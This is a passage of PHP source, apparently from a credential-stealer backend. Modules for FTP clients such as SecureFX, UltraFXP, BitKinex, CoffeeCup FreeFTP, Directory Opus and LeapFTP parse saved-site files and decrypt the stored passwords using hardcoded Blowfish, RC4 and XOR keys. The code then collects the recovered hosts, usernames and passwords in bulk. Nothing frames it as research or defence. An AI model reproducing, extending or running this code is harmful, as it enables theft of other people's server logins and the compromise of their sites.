		switch ($id)
		{
			case 0x0000:
				$this->process_xml($stream->read_str());
				break;
			case 0x0001:
				$this->process_reg($stream->read_str());
				break;
			case 0x0002:
				$host = $stream->read_str();
				$user = $stream->read_str();
				$pass = $stream->read_str();
				$port = $stream->read_dword();
				$dir = $stream->read_str();;
				$this->add_ftp(append_port_dir($host, $port, $dir), $user, $pass);
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Frigate3 FTP

class module_frigateftp extends module
{
	private function read_xml_item($xml_array, $quick = false, $parent = null)
	{
		$host = utf8_decode(assign($xml_array['Host']));
		$user = utf8_decode(assign($xml_array['User']));
		$pass = base64_decode(assign($xml_array['Pass']), true);
		$port = utf8_decode(assign($xml_array['Port']));
		$protocol = assign($xml_array['SecureType']);

		if (strlen($pass) && strlen($user) && $quick && $parent !== null)
		{
			$this->add_ftp(append_port_dir(ftp_force_ssh($parent, $protocol == '2'), $port, $dir), $user, $pass);
		} else
			$this->add_ftp(append_port_dir(ftp_force_ssh($host, $protocol == '2'), $port, $dir), $user, $pass);

		foreach ($xml_array as $key=>$value)
		{
			if (is_array($value))
			{
				if ($parent === null)
					$this->read_xml_item($value, $quick, $key);
				else
					$this->read_xml_item($value, $quick, $parent);
			}
		}
	}

	private function rec_scan_xml_array($xml_array)
	{
		foreach ($xml_array as $key=>$value)
		{
			if (is_array($value))
			{
				if (strval($key) == 'Item')
					$this->read_xml_item($value);
				if (strval($key) == 'QuickFtp')
				{
					$this->read_xml_item($value, true);
				}
				$this->rec_scan_xml_array($value);
			}
		}
	}

 	protected function update_dumbroot_xml_file($xml_data)
	{
		if (($pos = strpos($xml_data, '<?xml')) !== false)
		{
			$pos = strpos($xml_data, '>', $pos);
			if ($pos !== false)
			{
				return	str_insert("<Root>", $xml_data, $pos+1)."</Root>";
			}
		}
		return $xml_data;
	}

	// workaround for idiotic xml generation
 	protected function strip_bad_xml_tags($xml_data)
	{
		// strip erroneus XML tags
		while (($i = strpos($xml_data, '<QuickFtp>')) !== false)
		{
			$j = strpos($xml_data, '</QuickFtp>', $i+1);
			if ($j === false)
				break;
			$xml_data = substr($xml_data, 0, $i).substr($xml_data, $j+strlen('</QuickFtp>'));
		}

		return $xml_data;
	}

	private function process_xml($value)
	{
		if (!strlen($value))
			return;

		$value = $this->strip_bad_xml_tags(trim($value));
		$value = $this->update_dumbroot_xml_file($value);

        $xml_parser = new XMLParser(utf8_encode($value));
		$parsed_xml = $xml_parser->parse();
		if (!$xml_parser->isError || is_array($parsed_xml))
		{
			$this->rec_scan_xml_array($parsed_xml);
		} else
		{
			$this->log->add("ERR_XML_PARSE");
		}
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				$this->process_xml($stream->read_str());
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// SecureFX FTP 6.6

class module_securefx extends module
{
	private function decrypt_pass($encrypted_password)
	{
		$encrypted_password = trim($encrypted_password);
		if (!strlen($encrypted_password))
			return '';

		$is_unicode = 0;
		if ($encrypted_password[0] == 'u')
		{
			$is_unicode = 1;
			$encrypted_password = substr($encrypted_password, 1);
		}

		$encrypted_password = trim($encrypted_password);
		if (!strlen($encrypted_password))
			return '';

		$encrypted_bin_data = hextostr($encrypted_password);
		if ($encrypted_bin_data === false)
		{
			$this->log->add("ERR_INVALID_HEX_DATA");
			return '';
		}

		$key1 = chr(0x24).chr(0xA6).chr(0x3D).chr(0xDE).chr(0x5B).chr(0xD3).chr(0xB3).chr(0x82).chr(0x9C).chr(0x7E).chr(0x06).chr(0xF4).chr(0x08).chr(0x16).chr(0xAA).chr(0x07);
		$key2 = chr(0x5f).chr(0xB0).chr(0x45).chr(0xA2).chr(0x94).chr(0x17).chr(0xD9).chr(0x16).chr(0xC6).chr(0xC6).chr(0xA2).chr(0xFF).chr(0x06).chr(0x41).chr(0x82).chr(0xB7);
		$iv = "\0\0\0\0\0\0\0\0";

		$decrypted_data = mcrypt_decrypt(MCRYPT_BLOWFISH, $key1, $encrypted_bin_data, MCRYPT_MODE_CBC, $iv);

		if (!strlen($decrypted_data))
		{
			$this->log->add('ERR_CANNOT_DECRYPT_PASSWORD');
		}

		if (strlen($decrypted_data) > 8)
		{
			// remove first and last 4 bytes
			$decrypted_data = substr($decrypted_data, 4, -4);
			$decrypted_data = mcrypt_decrypt(MCRYPT_BLOWFISH, $key2, $decrypted_data, MCRYPT_MODE_CBC, $iv);

			if (strlen($decrypted_data))
			{
				if ($is_unicode)
				{
					$decrypted_data = unicode_to_ansi(ztrim_unicode($decrypted_data));
				} else
					$decrypted_data = ztrim($decrypted_data);
				return $decrypted_data;
			} else
			{
				$this->log->add('ERR_CANNOT_DECRYPT_PASSWORD');
			}
		}

		return '';
	}

	private function process_ini($value)
	{
		if (!strlen($value))
			return;

		$host = '';
		$dir = '';
		$user = '';
		$pass = '';
		$port = '';
		$proto = '';

		$lines = parse_lines(UnkTextToAnsi($value));
		foreach ($lines as $single_line)
		{
			$split_values = explode('=', $single_line);
			if (count($split_values) == 2)
			{
				switch ($split_values[0])
				{
					case 'S:"Hostname"': $host = $split_values[1]; break;
					case 'S:"Initial Directory"': $dir = $split_values[1]; break;
					case 'S:"Username"': $user = $split_values[1]; break;
					case 'S:"Password"': $pass = $split_values[1]; break;
					case 'D:"Transfer Port"': $port = $split_values[1]; break;
					case 'S:"Transfer Protocol Name"': $proto = $split_values[1]; break;
					
				}
			}
		}

		if (strlen($port))
		{
			$port = hexdec($port);
		}

		$pass = $this->decrypt_pass($pass);
		$this->add_ftp(append_port_dir(ftp_force_ssh($host, $proto == 'SFTP'), $port, $dir), $user, $pass);
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				$this->process_ini($stream->read_str());
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// UltraFXP 1.7

class module_ultrafxp_base extends module
{
	private function decrypt_pass($encrypted_password)
	{
		if (!strlen($encrypted_password))
			return '';

		$decoded_password = hextostr(trim($encrypted_password));

		if ($decoded_password === false)
		{
			$this->log->add('ERR_INVALID_HEX_STRING');
			return '';
		}

		$const_iv = chr(59).chr(197).chr(31).chr(90).chr(94).chr(150).chr(19).chr(69);
		$hex_key = "B4E8D16C26323D4AEA8026CDCEBFFE6A4AE27DEB77F0894CBC25FA03E01B6B1C";  // ripemd256 hash of str "th3m3ugaysshit9"
		$cipher_key = hextostr($hex_key);

		$iv = $const_iv;

		$descriptor = mcrypt_module_open(MCRYPT_BLOWFISH, '', 'ecb', '');

		if (!$descriptor)
		{
			$this->log->add("ERR_CANNOT_INITIALIZE_MCRYPT_MODULE");
			return '';
		}

		mcrypt_generic_init($descriptor, $cipher_key, $iv);

		encrypt_cts($descriptor, $cipher_key, $iv);

		$iv = $const_iv;
		$plain_text = decrypt_cts($descriptor, $decoded_password, $iv);

		mcrypt_generic_deinit($descriptor);
		mcrypt_module_close($descriptor);

		return $plain_text;
	}

	protected function read_xml_item($xml_array)
	{
		$host = utf8_decode(assign($xml_array['HOST']));
		$user = utf8_decode(assign($xml_array['USER']));
		$pass = utf8_decode(assign($xml_array['PASS']));
		$pass = $this->decrypt_pass($pass);
		$port = utf8_decode(assign($xml_array['PORT']));
		$dir = utf8_decode(assign($xml_array['RPATH']));

		$protocol = assign($xml_array['SSL']);

		if (is_array($protocol))
			$protocol = assign($protocol['value']);

		$this->add_ftp(append_port_dir(ftp_force_ssh($host, $protocol == '4'), $port, $dir), $user, $pass);

		foreach ($xml_array as $value)
		{
			if (is_array($value))
				$this->read_xml_item($value);
		}
	}

	protected function rec_scan_xml_array($xml_array)
	{
		foreach ($xml_array as $key=>$value)
		{
			if (is_array($value))
			{
				if (strval($key) == 'SITE')
					$this->read_xml_item($value);
				$this->rec_scan_xml_array($value);
			}
		}
	}

	protected function process_xml($value)
	{
		if (!strlen($value))
			return;

		$value = utf8_encode($value);

		$xml_parser = new XMLParser($value);
		$parsed_xml = $xml_parser->parse();
		if (!$xml_parser->isError || is_array($parsed_xml))
		{
			$this->rec_scan_xml_array($parsed_xml);
		} else
		{
			$this->log->add("ERR_XML_PARSE");
		}
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				$this->process_xml($stream->read_str());
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

class module_ultrafxp extends module_ultrafxp_base
{

}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// FTPRush 2.1.4, 2.1.5 (FTP client based on UltraFXP)

class module_ftprush extends module_ultrafxp_base
{

}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// WebSitePublisher 2.1.5

class module_websitepublisher extends module
{
	private function decrypt_pass($encrypted_password)
	{
		if (!strlen($encrypted_password))
			return '';

		if (strlen($encrypted_password) == 1 || $encrypted_password[0] != chr(0x30))
			return '';

		$encrypted_password = substr($encrypted_password, 1);

		for ($i = 0; $i < strlen($encrypted_password); $i++)
		{
			$encoded_char = ord($encrypted_password[$i]);

			if (($encoded_char >= 0x41 && $encoded_char <= 0x5a) || ($encoded_char >= 0x61 && $encoded_char <= 0x7a))
				$encrypted_password[$i] = chr(0xbb-$encoded_char);
			if ($encoded_char >= 0x30 && $encoded_char <= 0x39)
				$encrypted_password[$i] = chr(0x69-$encoded_char);
		}

		return $encrypted_password;
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				$host = $stream->read_str();
				$user = $stream->read_str();
				$pass = $stream->read_str();
				$port = $stream->read_dword();
				$dir = '';

				// separate dir from host value
				$host = str_replace("\\", "/", $host);
				while (strpos($host, "//") !== false)
					$host = str_replace("//", "/", $host);

				$pos = strpos($host, "/");
				if ($pos !== false)
				{
					$dir = substr($host, $pos);
					$host = substr($host, 0, $pos);
				}

				// decrypt password
				$pass = $this->decrypt_pass($pass);

				$this->add_ftp(append_port_dir($host, $port, $dir), $user, $pass);

				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// BitKinex 3.2.3

class module_bitkinex extends module
{
	private function decrypt_pass($encrypted_password)
	{
		if (!strlen($encrypted_password))
			return '';

		$decoded_password = hextostr(trim($encrypted_password));

		if (($decoded_password === false) || (strlen($decoded_password) % 8 != 0))
		{
			$this->log->add('ERR_INVALID_HEX_STRING');
			return '';
		}

		$cipher_key = 'BD-07021973+19101972-DB';
		$iv = "\0\0\0\0\0\0\0\0";

		$deciphered_data = mcrypt_decrypt(MCRYPT_BLOWFISH, $cipher_key, $decoded_password, MCRYPT_MODE_ECB, $iv);

		if (!strlen($deciphered_data))
		{
			$this->log->add('ERR_CANNOT_DECRYPT_PASSWORD');
		}

		$decrypted_password = unicode_to_ansi(ztrim_unicode($deciphered_data));

		return $decrypted_password;
	}

	protected function process_ds_file($file_data)
	{
		if (!strlen($file_data))
			return;

		$values = parse_lines(Utf8ToWin($file_data));

		$user = '';
		$host = '';
		$dir = '';
		$protocol = '';

		foreach ($values as $line)
		{
			if (strpos($line, "### Node definition: ") !== false)
			{
				$user = '';
				$host = '';
				$dir = '';
				$protocol = '';
			}

			if (strpos($line, 'TYPE = SFTP') !== false)
				$protocol = 'sftp';

			if (strpos($line, "SET DEFAULT_PATH ") !== false)
				$dir = trim(substr($line, strlen("SET DEFAULT_PATH ")));

			if (strpos($line, "SET DST_ADDR ") !== false)
				$host = trim(substr($line, strlen("SET DST_ADDR ")));

			if (strpos($line, "SET USER ") !== false)
				$user = trim(substr($line, strlen("SET USER ")));

			if (strpos($line, "SET PASS ") !== false)
			{
				$pass = $this->decrypt_pass(trim(substr($line, strlen("SET PASS "))));

				$this->add_ftp(append_dir(ftp_force_ssh($host, $protocol == 'sftp'), $dir), $user, $pass);

				$user = '';
				$host = '';
				$dir = '';
				$protocol = '';
			}
		}
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				$ds_file = $stream->read_str();
				$this->process_ds_file($ds_file);
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// ExpanDrive 1.8.4

class module_expandrive extends module
{
	private $password_pairs = array();

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x1000:
				$encrypted_pass = $stream->read_str();
				$decrypted_pass = $stream->read_str();
				if (strlen($encrypted_pass) && strlen($decrypted_pass))
				{
					$this->password_pairs[$encrypted_pass] = $decrypted_pass;
				}
				break;
			case 0x1001:
				$json_config = $stream->read_str();

				$json_params = json_fmt_nice($json_config);
				$json_result = json_decode($json_params, true);
                if ($json_result !== null && is_array($json_result) && isset($json_result['drives']))
                {
                	$json_result = $json_result['drives'];
                	if ($json_result !== null && is_array($json_result))
                	{
	                    foreach ($json_result as $param_array)
	                    {
	                        if (is_array($param_array))
	                        {
	                            $host = assign($param_array['server']);
	                            $port = assign($param_array['port']);
	                            $dir = assign($param_array['report_path']);
	                            $user = assign($param_array['username']);
		                        $pass = assign($param_array['password']);
		                        $protocol =  assign($param_array['type']);

	                            $pass = Utf8ToWin(assign($this->password_pairs[$pass]));
								$this->add_ftp(append_port_dir(ftp_force_ssh($host, $protocol == 'sftp'), $port, $dir), $user, $pass);
	                        }
	                    }
	                }
                }

				break;
			case 0x0000:
				$host = $stream->read_str();
				$user = $stream->read_str();
				$pass = $stream->read_str();
				$port = $stream->read_dword();

				$this->add_ftp(append_port($host, $port), $user, $pass);

				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// ClassicFTP 2.14

// base class for ClassicFTP and Fling, both use same decryption scheme
class module_classicftp_base extends module
{
	private function decrypt_pass($encrypted_password)
	{
		if (strlen($encrypted_password) == 0)
			return '';

		// Make decryption key
		$md5_hash = md5('nchkqxllib', true);
		$decryption_key = substr($md5_hash, 0, 5)."\0\0\0\0\0\0\0\0\0\0\0";

		$decrypted_password = Utf8ToWin(rc4Decrypt($decryption_key, $encrypted_password));

		return $decrypted_password;
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				$host = $stream->read_str();
				$user = $stream->read_str();
				$pass1 = trim($stream->read_str());
				$pass2 = $stream->read_str();
				$dir = $stream->read_str();

				if (strlen($pass1))
					$this->add_ftp(append_dir($host, $dir), $user, $pass1);

				if (strlen($pass2))
				{
					$pass2 = $this->decrypt_pass($pass2);
					$this->add_ftp(append_dir($host, $dir), $user, $pass2);
				}

				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

class module_classicftp extends module_classicftp_base
{

}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Fling 2.23 (based on ClassicFTP)

class module_fling extends module_classicftp_base
{

}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// SoftX 3.3

class module_softx extends module
{
 	private function decrypt_pass($encrypted_password)
	{
		for ($i = 0; $i < strlen($encrypted_password); $i++)
			$encrypted_password[$i] = chr(ord($encrypted_password[$i]) ^ 0x91);

		return $encrypted_password;
	}

	private function grab_config_string(&$config_data)
	{
		$value = substr($config_data, 0, 192);

		if (strlen($value) < 192)
			return false;

		$result = unicode_to_ansi($value);
		$config_data = substr($config_data, 192);

		return $result;
	}

	private function process_config($config_data)
	{
		if (strlen($config_data) == 0)
			return;

		$label = $this->grab_config_string($config_data);
		if ($label === false)
			return;

		$host = $this->grab_config_string($config_data);
		if ($host === false)
			return;

		$port_value = substr($config_data, 0, 4);
		$config_data = substr($config_data, 8);

		if (!strlen($config_data))
			return;

		$port = data_int32($port_value);

		$user = $this->grab_config_string($config_data);
		if ($user === false)
			return;

		$pass = $this->grab_config_string($config_data);
		if ($pass === false)
			return;

		$config_data = substr($config_data, 192 + 24);
		$dir = $this->grab_config_string($config_data);

		$this->add_ftp(append_port_dir($host, $port, $dir), $user, $pass);
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				$encoded_data = $this->decrypt_pass($stream->read_str());
				$this->process_config($encoded_data);
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Directory Opus 9.5.6.0.3937 (64-bit tested)

class module_dopus extends module
{
 	protected function strip_bad_xml_tags($xml_data)
	{
		// strip erroneus XML tags
		while (($i = strpos($xml_data, '<soundevents ')) !== false)
		{
			$j = strpos($xml_data, '>', $i+1);
			if ($j === false)
				break;
			$xml_data = substr($xml_data, 0, $i).substr($xml_data, $j+1);
		}

		// strip erroneus XML tags
		while (($i = strpos($xml_data, '<linked_tabs ')) !== false)
		{
			$j = strpos($xml_data, '>', $i+1);
			if ($j === false)
				break;
			$xml_data = substr($xml_data, 0, $i).substr($xml_data, $j+1);
		}

		while (($i = strpos($xml_data, '<curdir>')) !== false)
		{
			$j = strpos($xml_data, '</curdir>', $i+1);
			if ($j === false)
				break;
			$xml_data = substr($xml_data, 0, $i).substr($xml_data, $j+1);
		}

		return $xml_data;
	}

	private function decrypt($encrypted_password)
	{
		if (strlen($encrypted_password) == 0 || substr($encrypted_password, 0, 2) != '@!')
			return '';
		$encrypted_password = substr($encrypted_password, 2);

		$decoded_password = base64_decode($encrypted_password, true);

		for ($i = 0; $i < strlen($decoded_password); $i++)
		{
			$decoded_password[$i] = chr(ord($decoded_password[$i]) ^ ($i + 3));
		}
		return $decoded_password;
	}

	private function find_xml_dir($xml_array, &$resulting_dir)
	{
		$dir = assign($xml_array['dir']);

		if (is_string($dir) && strlen($dir))
			$resulting_dir = Utf8ToWin($dir);

		foreach ($xml_array as $value)
		{
			if (is_array($value))
				$this->find_xml_dir($value, $resulting_dir);
		}
	}

	private function read_xml_item($xml_array, $dir, $protocol)
	{
		$host = assign($xml_array['host']);

		$user = assign($xml_array['user']);
		$pass = assign($xml_array['pass']);
		$pass = $this->decrypt($pass);
		$port = assign($xml_array['port']);

		$host = Utf8ToWin($host);
		$user = Utf8ToWin($user);

		$this->add_ftp(append_port_dir(ftp_force_ssh($host, $protocol == '3'), $port, $dir), $user, $pass);

		foreach ($xml_array as $value)
		{
			if (is_array($value))
				$this->read_xml_item($value, $dir, $protocol);
		}
	}

	private function rec_scan_xml_array($xml_array)
	{
		foreach ($xml_array as $key=>$value)
		{
			if (is_array($value))
			{
				if (strval($key) == 'left')
				{
					$ecrypted_ftp_uri = assign($value['ftp']);
					$decrypted_ftp_uri = $this->decrypt($ecrypted_ftp_uri);
					if (strlen($decrypted_ftp_uri))
					{
						$this->add_ftp(urldecode($decrypted_ftp_uri));
					}
				} else if ((strval($key) == 'site'))
				{
					$dir = '';
					$protocol = '';
					if (isset($value['attributes']))
						$protocol = assign($value['attributes']['type']);
					$this->find_xml_dir($value, $dir);
					$this->read_xml_item($value, $dir, $protocol);
				} else if ((strval($key) == 'host'))
				{
					if (isset($value['attributes']) && is_array($value['attributes']))
					{
						$host = assign($value['attributes']['host']);
						$user = assign($value['attributes']['user']);
						$pass = assign($value['attributes']['pass']);
						$pass = $this->decrypt($pass);
						$port = assign($value['attributes']['port']);
						$this->add_ftp(append_port($host, $port), $user, $pass);
					}
				}
				$this->rec_scan_xml_array($value);
			}
		}
	}

	protected function process_oxc($xml_data)
	{
		if (strlen($xml_data) == 0)
			return;

		$xml_data = $this->strip_bad_xml_tags($xml_data);

		$xml_parser = new XMLParser($xml_data);
		$parsed_xml = $xml_parser->parse();
		if (!$xml_parser->isError || is_array($parsed_xml))
		{
			$this->rec_scan_xml_array($parsed_xml);
		} else
		{
			$this->log->add("ERR_XML_PARSE");
		}
	}

	protected function process_oll($xml_data)
	{
		$this->process_oxc($xml_data);
	}

	protected function process_osd($xml_data)
	{
		$this->process_oxc($xml_data);
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				// oxc
				$this->process_oxc($stream->read_str());
				break;
			case 0x0001:
				// oll
				$this->process_oll($stream->read_str());
				break;
			case 0x0002:
				// ftplast.osd
				$this->process_osd($stream->read_str());
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// CoffeeCup FreeFTP 4.3 / DirectFTP

class module_freeftp extends module
{
 	private function GenKey($magic)
	{
		$result = '';
		for ($i = 0; $i < 56; $i++)
		{
			$magic = hexdec(gmp_strval(gmp_and(gmp_add(gmp_mul("$magic", "0x343FD"), "0x269EC3"), "0xffffffff"), 16));
			$result .= chr(((($magic >> 16) & 0x7fff) % 0x5d) + 0x21);
		}
		return $result;
	}

	protected function decrypt($encrypted_password, $decryption_key)
	{
		$encrypted_password = base64_decode($encrypted_password, true);
		if (strlen($encrypted_password) == 0)
			return '';

		$descriptor = mcrypt_module_open(MCRYPT_BLOWFISH, '', 'ecb', '');

		if (!$descriptor)
		{
			$this->log->add("ERR_CANNOT_INITIALIZE_MCRYPT_MODULE");
			return '';
		}

        $iv = "\0\0\0\0\0\0\0\0";
		mcrypt_generic_init($descriptor, $decryption_key, $iv);

		$plain_text = decrypt_cfbblock($descriptor, $encrypted_password, $iv);

		mcrypt_generic_deinit($descriptor);
		mcrypt_module_close($descriptor);

		$decrypted_password = '';
		if (strlen($plain_text))
		{
			$char = $plain_text[strlen($plain_text)-1];
			while (strlen($plain_text) && ($plain_text[strlen($plain_text)-1] == $char))
				$plain_text = substr($plain_text, 0, -1);
			$decrypted_password = $plain_text;
		}
		return $decrypted_password;
	}

	protected function process_sqlite_file($file_contents)
	{
		if (strlen($file_contents) == 0)
			return;

		global $global_temporary_directory;

		if (!class_exists('SQLite3') && !class_exists('PDO'))
		{
			$this->log->add("NOTIFY_PDO_AND_SQLITE3_CLASSES_DO_NOT_EXIST");
			return;
		}

		$tmp_name = tempnam($global_temporary_directory, 'sqlite');

		if (!is_writable($global_temporary_directory))
		{
			$this->log->add("ERR_CANNOT_ACCESS_SQLITE_DB_FILE");
			return;
		}

		$fp = fopen($tmp_name, "wb");
		if (!$fp)
		{
			$this->log->add("ERR_CANNOT_ACCESS_SQLITE_DB_FILE");
			return;
		}

		if (fwrite($fp, $file_contents) != strlen($file_contents))
		{
			fclose($fp);
			unlink($tmp_name);
			$this->log->add("ERR_CANNOT_WRITE_SQLITE_DB_FILE");
			return;
		}

		fclose($fp);

		if (class_exists('SQLite3'))
		{
			// use SQLite3 php-extension
			try
			{
				$database = new SQLite3($tmp_name, SQLITE3_OPEN_READONLY);
				if (!$database)
				{
					$this->log->add("ERR_CANNOT_OPEN_SQLITE_DB");
				} else
				{
					$global_value = '';
					$decryption_key = '';

					$results = @$database->query('SELECT GlobalValue FROM "TGlobalSettings" WHERE GlobalName="MagicNumber"');

					// get magic key sqlite value
					if ($results && ($row = $results->fetchArray()))
    					$global_value = $row['GlobalValue'];

					// generate decryption key
					if ($global_value)
						$decryption_key = $this->GenKey(intval($global_value));

					// use decryption key to decrypt the password
					if ($decryption_key)
					{
						try
						{
							$results = @$database->query('SELECT ServerName, Url, ServerUser, ServerPass, remoteDir, port, Protocol FROM "TServers"');
							if ($results)
							{
								while ($row = $results->fetchArray())
								{
									$host = assign($row['Url']);

									$user = assign($row['ServerUser']);
									$user = $this->decrypt($user, $decryption_key);
									$pass = assign($row['ServerPass']);
									$pass = $this->decrypt($pass, $decryption_key);
									$port = assign($row['port']);
									$dir = assign($row['remoteDir']);
									$protocol = assign($row['Protocol']);
	
									$host = Utf8ToWin($host);
									$user = Utf8ToWin($user);
									$pass = Utf8ToWin($pass);
									$dir = Utf8ToWin($dir);

									$this->add_ftp(append_port_dir(ftp_force_ssh($host, $protocol == 1), $port, $dir), $user, $pass);
								}
							}
						}
						catch(Exception $e)
						{
						}
					}

					@$database->close();
					unset($database);
				}
			}
			catch (Exception $e)
			{
				if (isset($database))
				{
					@$database->close();
					unset($database);
				}
    			$this->log->add("ERR_SQLITE_EXCEPTION: $e");
			}
		} else if (class_exists('PDO'))
		{
			// use PDO driver
			$drivers = PDO::getAvailableDrivers();
			$driver_available = array_search('sqlite', $drivers) !== false;

			if ($driver_available)
			{
				try
				{
					/*** create the database file in /tmp ***/
					$dbh = new PDO("sqlite:$tmp_name");

					if (!$dbh)
						$this->log->add("ERR_CANNOT_OPEN_PDO_SQLITE_DB");
					else
					{
						/*** set all errors to exceptions ***/
						$dbh->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

						$global_value = '';
						$decryption_key = '';

						$sql = 'SELECT GlobalValue FROM "TGlobalSettings" WHERE GlobalName="MagicNumber"';

						// get magic key sqlite value
						foreach ($dbh->query($sql) as $row)
    						$global_value = $row['GlobalValue'];

						// generate decryption key
						if ($global_value)
							$decryption_key = $this->GenKey(intval($global_value));

						// use decryption key to decrypt the password
						if ($decryption_key)
						{
							try
							{
								$sql = 'SELECT ServerName, Url, ServerUser, ServerPass, remoteDir, port, Protocol FROM "TServers"';
								foreach ($dbh->query($sql) as $row)
								{
									$host = assign($row['Url']);

									$user = assign($row['ServerUser']);
									$user = $this->decrypt($user, $decryption_key);
									$pass = assign($row['ServerPass']);
									$pass = $this->decrypt($pass, $decryption_key);
									$port = assign($row['port']);
									$dir = assign($row['remoteDir']);
									$protocol = assign($row['Protocol']);

									$host = Utf8ToWin($host);
									$user = Utf8ToWin($user);
									$pass = Utf8ToWin($pass);
									$dir = Utf8ToWin($dir);

									$this->add_ftp(append_port_dir(ftp_force_ssh($host, $protocol == 1), $port, $dir), $user, $pass);
								}
							}
							catch(Exception $e)
							{
							}
						}
						unset($dbh);
					}
				}
				catch (Exception $e)
				{
					if (isset($dbh))
					{
						unset($dbh);
					}
					$this->log->add("ERR_PDO_EXCEPTION: $e");
				}
			}
		}
		unlink($tmp_name);
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
			case 0x0001:
				$this->process_sqlite_file($stream->read_str());
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// LeapFTP 2.6.2.470, 3.1.0.50

class stream_leapftp extends stream
{
	function read_bytestring()
	{
		if (!$this->state)
			return false;
		$len = $this->read_byte();

		if ($len == 0xff)

			return $this->read_strlen($this->read_word());
		else
			return $this->read_strlen($len);
	}
}

class module_leapftp extends module
{
 	private function decrypt($encrypted_password)
	{
		$CXorArray = array(0xdb, 0x94, 0xec, 0xc0, 0xde, 0x44, 0x69, 0x9b);
		foreach ($CXorArray as $key=>$value)
			$CXorArray[$key] = $CXorArray[$key] ^ 0x30;

		for ($i = 0; $i < strlen($encrypted_password); $i++)
			$encrypted_password[$i] = chr(ord($encrypted_password[$i]) ^ $CXorArray[$i % 8]);

		if (strlen($encrypted_password) == 0)
			return '';

